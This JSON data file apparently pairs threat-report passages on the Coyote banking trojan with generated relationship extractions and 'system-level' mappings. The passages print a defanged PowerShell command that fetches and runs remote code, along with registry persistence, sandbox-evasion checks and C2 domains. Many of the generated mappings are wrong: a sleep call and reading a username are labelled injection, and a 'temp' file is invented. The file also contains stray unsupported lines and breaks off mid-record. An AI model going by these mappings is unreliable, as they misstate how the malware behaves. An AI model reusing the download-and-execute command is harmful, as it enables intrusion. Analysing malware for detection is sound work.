[
    {
        "phase": "initial access",
        "content": "The LNK file executes the following PowerShell command, which connects to a remote server to initiate the next stage: -w hid -noni -ep Bypass -c \"Start-Job -Name PSSGR -ScriptBlock { IEX (iwr -Uri 'hxxps://tbet[.]geontrigame[.]com/zxchzzmism' -UseBasicParsing).Content }; Start-Sleep 131.\"\nWe analyzed multiple malicious files by examining the \"Machine ID\" embedded within the LNK files. This unique identifier provides critical insights into the system where the LNK file originated. By extracting and analyzing this metadata, we traced connections to other malicious LNK files associated with Coyote.\nThe content in \"zxchzzmism\" is an additional PowerShell script that holds two encoded data segments. This script employs specific commands to decode and execute the embedded shellcode, initiating the next phase of the malicious operation.",
        "relationship": "1. [CoT]: The text states that the LNK file executes a PowerShell command which connects to a remote server (hxxps://tbet[.]geontrigame[.]com/zxchzzmism) to initiate the next stage.   [Relationships]: <process:LNK file,connects to,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. \n2. [CoT]: The PowerShell command executes a scriptblock that includes the URL (iwr -Uri 'hxxps://tbet[.]geontrigame[.]com/zxchzzmism' -UseBasicParsing).Content.   [Relationships]: <process:PowerShell,executes,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. \n3. [CoT]: The PowerShell command uses Start-Job to create a job named PSSGR.   [Relationships]: <process:PowerShell,creates,process:PSSGR>. \n4. [CoT]: The PowerShell command uses Start-Sleep to pause the execution for 131 seconds.   [Relationships]: <process:PowerShell,pauses,process:Start-Sleep 131>. ",
        "semantic_relationship": "[CoT]: The original relationship states that the LNK file \"connects to\" a remote server via a socket. In system-level terms, this corresponds to a Process-to-Socket \"Connect\" relationship, as the LNK file (being executed as a process) is establishing a connection to a remote socket. [System-level Relationships]: <process:LNK file,Connect,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. \n[CoT]: The original relationship states that PowerShell executes a socket (URL), which in system-level terms translates to a Process-to-Connect relationship, as the process is establishing a connection to the remote socket (URL). [System-level Relationships]: <process:PowerShell,Connect,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. \n[CoT]: The original relationship states that PowerShell \"creates\" a job named PSSGR, which in system-level terms translates to a process creating another process (Job). Therefore, the relationship is converted to \"Fork\". [System-level Relationships]: <process:PowerShell,Fork,process:PSSGR>. \n[CoT]: The original relationship \"pauses\" indicates that PowerShell is causing the Start-Sleep process to pause its execution. In system-level terms, this is best represented as an \"Inject\" relationship from PowerShell to Start-Sleep, as it involves injecting code or signals to cause the sleep. [System-level Relationships]: <process:PowerShell,Inject,process:Start-Sleep 131>. "
    },
    {
        "phase": "execution",
        "content": "The \"bmwiMcDec\" DLL file functions as a loader, utilizing VirtualAllocEx and WriteProcessMemory to inject the \"npuGDec\" payload. It then employs CreateRemoteThread to execute the injected malicious code, facilitating the continuation of the attack.\nThe injected code leverages Donut, a tool designed to decrypt and execute the final MSIL (Microsoft Intermediate Language) payloads. This ensures seamless delivery and execution of the attack's next stage.\nThe decrypted MSIL execution file first establishes persistence by modifying the registry at \"HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\" It checks for any existing PowerShell command in this registry entry. If found, it removes the existing entry and creates a new one with a randomly generated name. This new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL, which facilitates the main functions of the Coyote Banking Trojan. The targeted URL for this operation is \"hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.\"\nIf the victim is the new target, it gathers basic system information, such as the machine name, username, and operating system, and sends it to a remote server. It also identifies installed antivirus products by querying the SecurityCenter2 namespace in Windows Management Instrumentation (WMI). The collected data is then concatenated with a \"|\" separator, encoded in Base64, and the resulting string is reversed. This processed string is appended as a parameter and sent back to the remote server as follows: \"hxxps://yezh[.]geontrigame[.]com/hqizjs/?l=y4CMuADfvJHUgATMgM3dvRmbpdFI0Z2bz9mcjlWT8JXZk5WZmVGRgM3dvRmbpdFfzlmcoNEf0IDR0Ul(omit).\"\nAfter setting and checking in, it calls \"CreateProcess\" to execute the PowerShell command that was added into the registry to invoke the payload:",
        "relationship": "1. [CoT]: The text states that \"bmwiMcDec\" DLL file uses \"VirtualAllocEx\" to inject the \"npuGDec\" payload into the running process.   [Relationships]: <process:bmwiMcDec,DLL,file:VirtualAllocEx,process,inject,file:npuGDec>. \n2. [CoT]: The text mentions that \"bmwiMcDec\" DLL file employs \"WriteProcessMemory\" to inject the \"npuGDec\" payload.   [Relationships]: <process:bmwiMcDec,DLL,file:WriteProcessMemory,process,inject,file:npuGDec>. \n3. [CoT]: The text describes that \"bmwiMcDec\" DLL file uses \"CreateRemoteThread\" to execute the injected malicious code.   [Relationships]: <process:bmwiMcDec,DLL,file:CreateRemoteThread,process,execute,file:injected malicious code>. \n4. [CoT]: The text states that the injected code leverages \"Donut\" to decrypt and execute the final MSIL payloads.   [Relationships]: <process:injected code,execute,tool:Donut,process,decrypt and execute,file:final MSIL payloads>. \n5. [CoT]: The text mentions that the decrypted MSIL execution file modifies the registry at \"HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\"   [Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:modify,process>. \n6. [CoT]: The text describes that the MSIL execution file checks for any existing PowerShell command in the specified registry key.   [Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:check,process>. \n7. [CoT]: The text states that if a PowerShell command is found, the MSIL execution file removes the existing registry entry.   [Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:remove,process>. \n8. [CoT]: The text mentions that the MSIL execution file creates a new registry entry with a randomly generated name in the same registry key.   [Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:create,process>. \n9. [CoT]: The text describes that the new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL.   [Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:contain,process,file:customized PowerShell command>. \n10. [CoT]: The text states that the PowerShell command sends data to a remote server, specifically the URL \"hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.\"   [Relationships]: <process:PowerShell,file:hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw,socket:send,process>. \n11. [CoT]: The text mentions that the victim's system gathers basic system information, including the machine name, username, and operating system.   [Relationships]: <process:victim,process:machine name,collect,process>. \n12. [CoT]: The text describes that the system gathers the username as part of the basic system information.   [Relationships]: <process:victim,process:username,collect,process>. \n13. [CoT]: The text states that the system gathers the operating system as part of the basic system information.   [Relationships]: <process:victim,process:operating system,collect,process>. \n14. [CoT]: The text mentions that the system queries the SecurityCenter2 namespace in WMI to identify installed antivirus products.   [Relationships]: <process:victim,process:SecurityCenter2,query,process>. \n15. [CoT]: The text describes that the gathered data, including system information and antivirus products, is concatenated with a \"|\" separator.   [Relationships]: <process:victim,process:system information and antivirus products,concatenate,process>. \n16. [CoT]: The text states that the concatenated string is encoded in Base64.   [Relationships]: <process:victim,process:system information and antivirus products,encode,process>. \n17. [CoT]: The text mentions that the encoded string is reversed.   [Relationships]: <process:victim,process:system information and antivirus products,reverse,process>. \n18. [CoT]: The text describes that the reversed string is appended",
        "semantic_relationship": "[CoT]: The original relationship indicates that the \"bmwiMcDec\" DLL file injects the \"npuGDec\" payload into a process. In system-level terms, this corresponds to a Process-to-Process injection, where one process (bmwiMcDec) injects code (npuGDec) into another process. The intermediate step of using VirtualAllocEx is part of the injection routine but does not change the core relationship type. [System-level Relationships]: <process:bmwiMcDec,process,,inject,file:npuGDec>. \n[CoT]: The original relationship describes a DLL file injecting payload into a process, which directly maps to the system-level \"Inject\" relationship between two processes. The term \"WriteProcessMemory\" is a function call used in the injection process, but the core action is the injection of payload from one process to another. [System-level Relationships]: <process:bmwiMcDec,Inject,process:npuGDec>. \n[CoT]: The original relationship states that the DLL file \"bmwiMcDec\" executes the injected malicious code, which directly translates to the system-level relationship \"Execute\" between a process and a file. The term \"CreateRemoteThread\" in the original relationship is a process injection technique used to load and run the DLL file, but this does not change the core execution relationship between the process and the file. [System-level Relationships]: <process:bmwiMcDec,file:injected malicious code,Execute>. \n[CoT]: The original relationship states that the injected code executes the tool \"Donut\" to decrypt and execute the final MSIL payloads. In system-level terms, this translates to a Process-to-Process relationship where the injected code (Fork) executes the Donut process (Fork). The reason for this is that the injected code is leveraging Donut as a tool to perform further actions, which aligns with the system-level \"Fork\" relationship between processes. [System-level Relationships]: <process:injected code,execute,process:Donut,process>. \n[CoT]: The original relationship indicates that the process modifies the registry key, which aligns with the system-level relationship \"Writekey\" as it involves writing to a registry key. [System-level Relationships]: <process:decrypted MSIL execution file,reg:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,Writekey,process>. \n[CoT]: The original relationship states that the MSIL execution file \"checks for\" PowerShell command in the registry key. This implies that the process is reading the registry key to check for specific content, which aligns with the system-level relationship \"Readkey\" between a process and a registry key. [System-level Relationships]: <process:decrypted MSIL execution file,reg:check,Readkey>. \n[CoT]: The original relationship states that the MSIL execution file removes a registry entry. In system-level terms, removing a registry key typically involves the Deletekey operation, which is part of the Process-to-Registry relationship category. Therefore, the system-level relationship is 'Deletekey'. [System-level Relationships]: <process:decrypted MSIL execution file,reg:Deletekey,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run>. \n[CoT]: The original relationship states that the process \"decrypted MSIL execution file\" creates a new registry entry. In system-level terms, this corresponds to a Process-to-Registry \"Createkey\" relationship, as the process is creating a new key (registry entry) in the specified registry location. [System-level Relationships]: <process:decrypted MSIL execution file,reg:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,Createkey,process>. \n[CoT]: The original relationship states that the decrypted MSIL execution file contains a customized PowerShell command. In system-level terms, this implies that the PowerShell command is being executed from the MSIL file, hence the \"Fork\" relationship between the two processes. The registry entry is simply a location where the PowerShell command is being stored, hence no system-level relationship is needed for it. [System-level Relationships]: <process:decrypted MSIL execution file,Fork,process:customized PowerShell command>. \n[CoT]: The original relationship indicates that PowerShell sends data to a remote server via a URL, which implies a network connection is established. In system-level terms, this corresponds to a 'Connect' relationship between the process (PowerShell) and the socket (remote server URL). The 'send' action is subsumed under the 'Connect' relationship as it involves initiating a network connection to the remote server. [System-level Relationships]: <process:PowerShell,socket:remote server URL,Connect,process>. \n[CoT]: The original relationship states that the victim's process collects the machine name, which implies that the victim's process is reading the machine name from the system. In system-level terms, this corresponds to a \"Read\" relationship between the victim process and the machine name. [System-level Relationships]: <process:victim,process:machine name,Read,process>. \n[CoT]: The original relationship indicates that the victim process is collecting (receiving) the username from another process. In system-level terms, this corresponds to the 'Inject' relationship between processes, where one process obtains data (username) from another process. [System-level Relationships]: <process:victim,process:username,Inject,process>. \n[CoT]: The original relationship \"collect\" implies that the victim process is gathering information from the operating system process. In system-level terms, this action corresponds to the \"Inject\" relationship between processes, where one process reads data from another process's memory space. [System-level Relationships]: <process:victim,process:operating system,Inject,process>. \n[CoT]: The original relationship indicates that the victim process is querying the SecurityCenter2 namespace in WMI. In system-level terms, this action corresponds to a 'Inject' operation from one process to another, as the victim process is inspecting or extracting data from the SecurityCenter2 process. [System-level Relationships]: <process:victim,process:SecurityCenter2,Inject>. \n[CoT]: The original relationship describes a process (victim) concatenating data with another process (system information and antivirus products). In system-level terms, this action involves writing the concatenated data to a temporary location, hence the 'Write' relationship. The temporary location is represented as a file named 'temp' for simplicity. [System-level Relationships]: <process:victim,Write,file:temp,process:system information and antivirus products>. \n[CoT]: The original relationship describes a process (victim) encoding data for another process (system information and antivirus products). In system-level terms, this action corresponds to \"Inject\" data from one process to another, as encoding is a form of data transformation prior to injection. [System-level Relationships]: <process:victim,process:system information and antivirus products,Inject,process>. \n[CoT]: The original relationship describes a process (victim) reversing the output of another process (system information and antivirus products). In system-level terms, this action corresponds to the \"Inject\" relationship between processes, as one process is modifying the memory content of another process. [System-level Relationships]: <process:victim,process:system information and antivirus products,Inject,process>. \n[CoT]: The original relationship \"Append\" indicates that the attacker is injecting data (reversed string) into the process's memory, which aligns with the system-level relationship \"Inject\" between a process and memory. [Inject]_process-memory\n[Description]: The text mentions \"Write to file\", which in system-level terms corresponds to the \"Write\" relationship between a process and a file. [Write]_process-file\n[Description]: The text states \"Read line from file\", which in system-level terms translates to the \"Read\" relationship between a process and a file. [Read]_process-file\n[Description]: The text describes \"Fork\" which in system-level terms corresponds to the \"Fork\" relationship between two processes. [Fork]_process-process\n[Description]: The text mentions \"Exit\", which in system-level terms corresponds to the \"Exit\" relationship between a process and itself. [Exit]_process-self"
    },
    {
        "phase": "command and control",
        "content": "The payload \"vxewhcacbfqnsw\" is similar to the one downloaded from the LNK file but is noticeably larger. This increase in size is due to the inclusion of the main Coyote Baking Trojan.\nWe obtained the MSIL file after decrypting the payload from the Donut shellcode. It contained the following functions:\nUsername Checking: It examines the username to see if any of the following test/sandbox names are present: Johnson, Miller, malware, maltest, CurrentUser, Sandbox, virus, John Doe, test user, sand box, WDAGUtilityAccount, Bruno, George, and Harry Johnson. \nVirtual Management Tool Checking: It examines whether the environment contains files or folders related to virtual machines. It checks for strings in the directory \"C:\\Windows\\System32\" such as qemu-ga, qemuwmi, balloon.sys, netkvm.sys, vioinput, viofs.sys, and vioser.sys. \nBuild Targeting List: In this version, Coyote expands its target list to include 1,030 sites and 73 financial agents, including mercadobitcoin.com.br, bitcointrade.com.br, foxbit.com.br, augustoshotel.com.br, blumenhotelboutique.com.br, and fallshotel.com.br. It then starts monitoring the active window.\nCommunicate with C2: Coyote continuously monitors the active window to detect if the victim attempts to access any target sites. If a target site is accessed, it contacts the C2 server via port 443. The server list includes geraatualiza[.]com, masterdow[.]com, and geraupdate[.]com. Coyote reads a message from a remote server, processes it by decoding and cleaning the data, and prepares it for further actions based on the length of the first string in the message.",
        "relationship": "1. [CoT]: The text states that the payload \"vxewhcacbfqnsw\" was downloaded from a LNK file, indicating a process-to-file relationship where the LNK file performed the action of downloading the payload.   [Relationships]: <process:LNK,file:vxewhcacbfqnsw/download>. \n2. [CoT]: The text mentions that the MSIL file was obtained after decrypting the payload from the Donut shellcode, showing a process-to-file relationship where the Donut shellcode performed the action of decrypting the payload.   [Relationships]: <process:Donut shellcode,file:payload/decrypt>. \n3. [CoT]: The MSIL file contains a function that examines the username for specific test or sandbox names, indicating a process-to-file relationship where the MSIL file performs the action of examining the username.   [Relationships]: <process:MSIL file,process:Username/Checking>. \n4. [CoT]: The MSIL file checks for certain strings in the directory \"C:\\Windows\\System32\", showing a process-to-file relationship where the MSIL file performs the action of checking for strings in the directory.   [Relationships]: <process:MSIL file,file:C:\\Windows\\System32/check>. \n5. [CoT]: Coyote expands its target list to include several sites and financial agents, indicating a process-to-file relationship where the MSIL file (represented by Coyote) performs the action of expanding its target list.   [Relationships]: <process:MSIL file,file:target list/expand>. \n6. [CoT]: Coyote monitors the active window for target site access, showing a process-to-process relationship where the MSIL file (represented by Coyote) performs the action of monitoring the active window.   [Relationships]: <process:MSIL file,process:active window/monitor>. \n7. [CoT]: If a target site is accessed, Coyote contacts the C2 server via port 443, indicating a process-to-socket relationship where the MSIL file (represented by Coyote) performs the action of contacting the C2 server.   [Relationships]: <process:MSIL file,socket:C2 server/contact>. \n8. [CoT]: Coyote reads a message from a remote server, showing a process-to-file relationship where the MSIL file (represented by Coyote) performs the action of reading a message. [Relationships]: <process:MSIL file,file:message/read>. ",
        "semantic_relationship": "[CoT]: The original relationship indicates that the LNK file performed an action of downloading the payload \"vxewhcacbfqnsw\". In system-level terms, downloading a payload typically involves writing the payload to a file, hence the action is mapped to \"Write\" in the process-to-file relationship. [System-level Relationships]: <process:LNK,file:vxewhcacbfqnsw/Write>. \n[CoT]: The original relationship indicates that the Donut shellcode performed a decryption action on the payload file. In system-level terms, this corresponds to a Read operation on the file (to access the encrypted content) followed by a Write operation (to create the decrypted output). The Read and Write operations are represented as separate relationships to reflect the actual processing involved. [System-level Relationships]: <process:Donut shellcode,file:payload/Read>,<process:Donut shellcode,file:payload/Write>.  \n[CoT]: The original relationship indicates that the MSIL file is checking the username, which implies that the MSIL file is inspecting or reading the username data. In system-level terms, this corresponds to a \"Read\" operation from the process to the username entity. [System-level Relationships]: <process:MSIL file,username:Read>. \n[CoT]: The original relationship indicates that the MSIL file is checking for strings in the directory \"C:\\Windows\\System32\\check\". This action implies that the process is reading the contents of the directory, which maps to the system-level relationship \"Read\" between a process and a file. [System-level Relationships]: <process:MSIL file,Read,file:C:\\Windows\\System32\\check>. \n[CoT]: The original relationship describes the MSIL file (Coyote) expanding its target list, which implies modifying the content of the file. In system-level terms, this action corresponds to a 'Write' operation on the file, as the process is writing new content to the target list file. [System-level Relationships]: <process:MSIL file,Write,file:target list>. \n[CoT]: The MSIL file (Coyote) is monitoring the active window, which implies it is injecting code into the active window process to extract information. This aligns with the system-level relationship 'Inject' between processes. [System-level Relationships]: <process:MSIL file,process:active window/Inject>. \n[CoT]: The original relationship describes the MSIL file (Coyote) contacting the C2 server via port 443, which implies a connection attempt from the process to the socket. In system-level terms, this is best represented as a 'Connect' relationship between the process and the socket. [System-level Relationships]: <process:MSIL file,socket:C2 server/Connect>. \n[CoT]: The original relationship describes a process (MSIL file) reading a message file. In system-level terms, this corresponds to a 'Read' action between a process and a file. [System-level Relationships]: <process:MSIL file,file:message,Read>. "
    },
    {
        "phase_relationship": [
            {
                "phase": "initial access",
                "relationship": "[Description]: The text states that the LNK file executes a PowerShell command which connects to a remote server (hxxps://tbet[.]geontrigame[.]com/zxchzzmism) to initiate the next stage.   [Original Relationships]: <process:LNK file,connects to,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the LNK file \"connects to\" a remote server via a socket. In system-level terms, this corresponds to a Process-to-Socket \"Connect\" relationship, as the LNK file (being executed as a process) is establishing a connection to a remote socket. [System-level Relationships]: <process:LNK file,Connect,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The PowerShell command executes a scriptblock that includes the URL (iwr -Uri 'hxxps://tbet[.]geontrigame[.]com/zxchzzmism' -UseBasicParsing).Content.   [Original Relationships]: <process:PowerShell,executes,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. ",
                "semantic_relationship": "[CoT]: The original relationship states that PowerShell executes a socket (URL), which in system-level terms translates to a Process-to-Connect relationship, as the process is establishing a connection to the remote socket (URL). [System-level Relationships]: <process:PowerShell,Connect,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The PowerShell command uses Start-Job to create a job named PSSGR.   [Original Relationships]: <process:PowerShell,creates,process:PSSGR>. ",
                "semantic_relationship": "[CoT]: The original relationship states that PowerShell \"creates\" a job named PSSGR, which in system-level terms translates to a process creating another process (Job). Therefore, the relationship is converted to \"Fork\". [System-level Relationships]: <process:PowerShell,Fork,process:PSSGR>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The PowerShell command uses Start-Sleep to pause the execution for 131 seconds.   [Original Relationships]: <process:PowerShell,pauses,process:Start-Sleep 131>. ",
                "semantic_relationship": "[CoT]: The original relationship \"pauses\" indicates that PowerShell is causing the Start-Sleep process to pause its execution. In system-level terms, this is best represented as an \"Inject\" relationship from PowerShell to Start-Sleep, as it involves injecting code or signals to cause the sleep. [System-level Relationships]: <process:PowerShell,Inject,process:Start-Sleep 131>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that \"bmwiMcDec\" DLL file uses \"VirtualAllocEx\" to inject the \"npuGDec\" payload into the running process.   [Original Relationships]: <process:bmwiMcDec,DLL,file:VirtualAllocEx,process,inject,file:npuGDec>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the \"bmwiMcDec\" DLL file injects the \"npuGDec\" payload into a process. In system-level terms, this corresponds to a Process-to-Process injection, where one process (bmwiMcDec) injects code (npuGDec) into another process. The intermediate step of using VirtualAllocEx is part of the injection routine but does not change the core relationship type. [System-level Relationships]: <process:bmwiMcDec,process,,inject,file:npuGDec>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text mentions that \"bmwiMcDec\" DLL file employs \"WriteProcessMemory\" to inject the \"npuGDec\" payload.   [Original Relationships]: <process:bmwiMcDec,DLL,file:WriteProcessMemory,process,inject,file:npuGDec>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a DLL file injecting payload into a process, which directly maps to the system-level \"Inject\" relationship between two processes. The term \"WriteProcessMemory\" is a function call used in the injection process, but the core action is the injection of payload from one process to another. [System-level Relationships]: <process:bmwiMcDec,Inject,process:npuGDec>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text describes that \"bmwiMcDec\" DLL file uses \"CreateRemoteThread\" to execute the injected malicious code.   [Original Relationships]: <process:bmwiMcDec,DLL,file:CreateRemoteThread,process,execute,file:injected malicious code>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the DLL file \"bmwiMcDec\" executes the injected malicious code, which directly translates to the system-level relationship \"Execute\" between a process and a file. The term \"CreateRemoteThread\" in the original relationship is a process injection technique used to load and run the DLL file, but this does not change the core execution relationship between the process and the file. [System-level Relationships]: <process:bmwiMcDec,file:injected malicious code,Execute>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that the injected code leverages \"Donut\" to decrypt and execute the final MSIL payloads.   [Original Relationships]: <process:injected code,execute,tool:Donut,process,decrypt and execute,file:final MSIL payloads>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the injected code executes the tool \"Donut\" to decrypt and execute the final MSIL payloads. In system-level terms, this translates to a Process-to-Process relationship where the injected code (Fork) executes the Donut process (Fork). The reason for this is that the injected code is leveraging Donut as a tool to perform further actions, which aligns with the system-level \"Fork\" relationship between processes. [System-level Relationships]: <process:injected code,execute,process:Donut,process>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text mentions that the decrypted MSIL execution file modifies the registry at \"HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\"   [Original Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:modify,process>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the process modifies the registry key, which aligns with the system-level relationship \"Writekey\" as it involves writing to a registry key. [System-level Relationships]: <process:decrypted MSIL execution file,reg:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,Writekey,process>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text describes that the MSIL execution file checks for any existing PowerShell command in the specified registry key.   [Original Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:check,process>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the MSIL execution file \"checks for\" PowerShell command in the registry key. This implies that the process is reading the registry key to check for specific content, which aligns with the system-level relationship \"Readkey\" between a process and a registry key. [System-level Relationships]: <process:decrypted MSIL execution file,reg:check,Readkey>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that if a PowerShell command is found, the MSIL execution file removes the existing registry entry.   [Original Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:remove,process>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the MSIL execution file removes a registry entry. In system-level terms, removing a registry key typically involves the Deletekey operation, which is part of the Process-to-Registry relationship category. Therefore, the system-level relationship is 'Deletekey'. [System-level Relationships]: <process:decrypted MSIL execution file,reg:Deletekey,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text mentions that the MSIL execution file creates a new registry entry with a randomly generated name in the same registry key.   [Original Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:create,process>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the process \"decrypted MSIL execution file\" creates a new registry entry. In system-level terms, this corresponds to a Process-to-Registry \"Createkey\" relationship, as the process is creating a new key (registry entry) in the specified registry location. [System-level Relationships]: <process:decrypted MSIL execution file,reg:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,Createkey,process>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text describes that the new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL.   [Original Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg:contain,process,file:customized PowerShell command>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the decrypted MSIL execution file contains a customized PowerShell command. In system-level terms, this implies that the PowerShell command is being executed from the MSIL file, hence the \"Fork\" relationship between the two processes. The registry entry is simply a location where the PowerShell command is being stored, hence no system-level relationship is needed for it. [System-level Relationships]: <process:decrypted MSIL execution file,Fork,process:customized PowerShell command>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that the PowerShell command sends data to a remote server, specifically the URL \"hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.\"   [Original Relationships]: <process:PowerShell,file:hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw,socket:send,process>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that PowerShell sends data to a remote server via a URL, which implies a network connection is established. In system-level terms, this corresponds to a 'Connect' relationship between the process (PowerShell) and the socket (remote server URL). The 'send' action is subsumed under the 'Connect' relationship as it involves initiating a network connection to the remote server. [System-level Relationships]: <process:PowerShell,socket:remote server URL,Connect,process>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text mentions that the victim's system gathers basic system information, including the machine name, username, and operating system.   [Original Relationships]: <process:victim,process:machine name,collect,process>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the victim's process collects the machine name, which implies that the victim's process is reading the machine name from the system. In system-level terms, this corresponds to a \"Read\" relationship between the victim process and the machine name. [System-level Relationships]: <process:victim,process:machine name,Read,process>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text describes that the system gathers the username as part of the basic system information.   [Original Relationships]: <process:victim,process:username,collect,process>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the victim process is collecting (receiving) the username from another process. In system-level terms, this corresponds to the 'Inject' relationship between processes, where one process obtains data (username) from another process. [System-level Relationships]: <process:victim,process:username,Inject,process>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that the system gathers the operating system as part of the basic system information.   [Original Relationships]: <process:victim,process:operating system,collect,process>. ",
                "semantic_relationship": "[CoT]: The original relationship \"collect\" implies that the victim process is gathering information from the operating system process. In system-level terms, this action corresponds to the \"Inject\" relationship between processes, where one process reads data from another process's memory space. [System-level Relationships]: <process:victim,process:operating system,Inject,process>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text mentions that the system queries the SecurityCenter2 namespace in WMI to identify installed antivirus products.   [Original Relationships]: <process:victim,process:SecurityCenter2,query,process>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the victim process is querying the SecurityCenter2 namespace in WMI. In system-level terms, this action corresponds to a 'Inject' operation from one process to another, as the victim process is inspecting or extracting data from the SecurityCenter2 process. [System-level Relationships]: <process:victim,process:SecurityCenter2,Inject>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text describes that the gathered data, including system information and antivirus products, is concatenated with a \"|\" separator.   [Original Relationships]: <process:victim,process:system information and antivirus products,concatenate,process>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (victim) concatenating data with another process (system information and antivirus products). In system-level terms, this action involves writing the concatenated data to a temporary location, hence the 'Write' relationship. The temporary location is represented as a file named 'temp' for simplicity. [System-level Relationships]: <process:victim,Write,file:temp,process:system information and antivirus products>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that the concatenated string is encoded in Base64.   [Original Relationships]: <process:victim,process:system information and antivirus products,encode,process>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (victim) encoding data for another process (system information and antivirus products). In system-level terms, this action corresponds to \"Inject\" data from one process to another, as encoding is a form of data transformation prior to injection. [System-level Relationships]: <process:victim,process:system information and antivirus products,Inject,process>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text mentions that the encoded string is reversed.   [Original Relationships]: <process:victim,process:system information and antivirus products,reverse,process>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (victim) reversing the output of another process (system information and antivirus products). In system-level terms, this action corresponds to the \"Inject\" relationship between processes, as one process is modifying the memory content of another process. [System-level Relationships]: <process:victim,process:system information and antivirus products,Inject,process>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text describes that the reversed string is appended",
                "semantic_relationship": "[CoT]: The original relationship \"Append\" indicates that the attacker is injecting data (reversed string) into the process's memory, which aligns with the system-level relationship \"Inject\" between a process and memory. [Inject]_process-memory\n[Description]: The text mentions \"Write to file\", which in system-level terms corresponds to the \"Write\" relationship between a process and a file. [Write]_process-file\n[Description]: The text states \"Read line from file\", which in system-level terms translates to the \"Read\" relationship between a process and a file. [Read]_process-file\n[Description]: The text describes \"Fork\" which in system-level terms corresponds to the \"Fork\" relationship between two processes. [Fork]_process-process\n[Description]: The text mentions \"Exit\", which in system-level terms corresponds to the \"Exit\" relationship between a process and itself. [Exit]_process-self"
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text states that the payload \"vxewhcacbfqnsw\" was downloaded from a LNK file, indicating a process-to-file relationship where the LNK file performed the action of downloading the payload.   [Original Relationships]: <process:LNK,file:vxewhcacbfqnsw/download>. ",
